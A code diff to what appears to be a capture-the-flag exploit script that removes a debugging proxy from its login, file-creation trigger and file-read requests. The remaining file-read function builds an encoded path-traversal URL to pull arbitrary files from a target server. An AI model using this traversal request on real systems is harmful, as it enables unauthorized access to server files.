@@ -62,10 +62,9 @@ def login(target_url, email, password, session):
     else:
         login_url = target_url + "/login"
 
-    proxy = {"http": "http://10.10.14.2:8080"}
     json = {"email": email, "password": password}
     headers = {"Content-Type": "application/json"}
-    r = session.post(login_url, json=json, headers=headers, proxies=proxy)
+    r = session.post(login_url, json=json, headers=headers)
 
     if r.status_code == 200 and "access_token" in r.text:
         pass
@@ -119,8 +118,7 @@ def trigger_file_creation(target_url, book_id):
     else:
         reminder_url = target_url + "/reminder/" + book_id
 
-    proxy = {"http": "http://10.10.14.2:8080"}
-    r = session.get(reminder_url, allow_redirects=False, proxies=proxy)
+    r = session.get(reminder_url, allow_redirects=False)
 
     if r.status_code != 302:
         print("[!] Something bad happened and we didn't trigger the file creation.")
@@ -133,8 +131,7 @@ def read_file(target_url, file_to_read):
         export_url = target_url + "/export/%2e%2e%2f%2e%2e" + file_to_read
 
     print()
-    proxy = {"http": "http://10.10.14.2:8080"}
-    r = session.get(export_url, proxies=proxy)
+    r = session.get(export_url)
     file_contents = r.text
 
     return file_contents
